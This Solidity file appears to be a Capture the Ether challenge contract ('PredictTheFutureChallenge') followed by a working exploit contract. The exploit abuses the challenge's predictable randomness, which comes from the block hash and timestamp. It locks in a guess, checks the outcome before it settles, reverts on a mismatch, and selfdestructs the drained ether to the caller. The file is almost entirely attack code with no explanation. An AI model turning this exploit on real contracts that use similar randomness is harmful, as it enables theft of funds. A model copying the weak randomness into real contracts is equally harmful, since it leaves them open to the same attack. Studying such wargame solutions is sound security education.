pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract PredictTheFutureChallengeExploit {
    PredictTheFutureChallenge _target;
    uint8 guess = 5;

    function PredictTheFutureChallengeExploit(address _targetAddress) public payable {
        require(msg.value == 1 ether);
        _target = PredictTheFutureChallenge(_targetAddress);
        _target.lockInGuess.value(msg.value)(guess);
    }

    function updateGuess(uint8 _guess) public {
        guess = _guess;
    }

    function settle() public {
        require(guess == uint8(keccak256(block.blockhash(block.number - 1), now)) % 10);

        _target.settle();

        require(_target.isComplete());

        selfdestruct(msg.sender);
    }

    function() public payable {}
}
